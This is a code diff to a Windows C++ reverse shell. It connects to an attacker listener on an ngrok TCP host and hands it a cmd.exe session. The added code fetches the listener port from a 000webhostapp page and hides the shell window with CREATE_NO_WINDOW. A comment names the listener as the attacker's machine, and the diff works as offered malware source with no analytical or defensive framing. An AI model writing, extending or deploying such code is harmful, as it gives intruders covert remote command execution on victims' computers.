@@ -2,6 +2,7 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <iostream>
+#include <string>
 #pragma comment(lib, "w2_32")
 
 
@@ -13,12 +14,18 @@ STARTUPINFO sui;
 PROCESS_INFORMATION pi;
 
 char* getAddr(char*);
+unsigned int scrapPort(char* domainName);
 
 int main(int argc, char* argv[])
 {
   // listener ip, port on attacker's machine
   const char* ip = getAddr("0.tcp.ap.ngrok.io");
-  short port = 11891;
+  short port = scrapPort("remotehostsmiley.000webhostapp.com");
+  // short port = 8080;
+  // memcpy(&port, &byPassPort, sizeof(port));
+
+  // const char* ip = "127.0.0.1";
+  // short port = 8080;
 
   // init socket lib
   WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -40,7 +47,7 @@ int main(int argc, char* argv[])
 
   // start cmd.exe with redirected streams
  
-  CreateProcess(NULL, (LPSTR)"C:\\windows\\system32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
+  CreateProcess(NULL, (LPSTR)"C:\\windows\\system32\\cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sui, &pi);
   return 0;
 }
 
@@ -92,4 +99,56 @@ char* getAddr(char* hostname){
     }
   }
   return inet_ntoa(addr);
+}
+
+unsigned int scrapPort(char* domainName){
+  std::string dataChunk;
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
+        std::cout << "WSAStartup failed.\n";
+        system("pause");
+        return 1;
+    }
+    SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+    struct hostent *host;
+    
+    host = gethostbyname(domainName);
+  
+
+    SOCKADDR_IN SockAddr;
+    SockAddr.sin_port=htons(80);
+    SockAddr.sin_family=AF_INET;
+    SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
+    // std::cout << "Connecting...\n";
+    if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0){
+        std::cout << "Could not connect";
+        system("pause");
+        return 1;
+    }
+   
+    std::string stringTest;
+    stringTest.append("GET / HTTP/1.1\r\nHost: ");
+    stringTest.append(domainName);
+    stringTest.append("\r\nConnection: close\r\n\r\n");
+
+    send(Socket,stringTest.c_str(), strlen(stringTest.c_str()),0);
+    char buffer[10000];
+    while ((recv(Socket,buffer,10000,0)) > 0){        
+        int i = 0;
+        while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') {
+            // std::cout << buffer[i];
+            dataChunk.push_back(buffer[i]);
+            i++;
+        }
+    }
+    closesocket(Socket);
+    WSACleanup();
+    // std::cout << "DATA: \n" << dataChunk << std::endl;
+    unsigned first = dataChunk.find("<p>");
+    unsigned last = dataChunk.find("</p>");
+    std::string newPort = dataChunk.substr (first,last-first); 
+    
+    std::cout << "PORT: " << newPort.substr(3,-1) << std::endl;
+    // system("pause");
+    return stoi(newPort.substr(3,-1));
 }
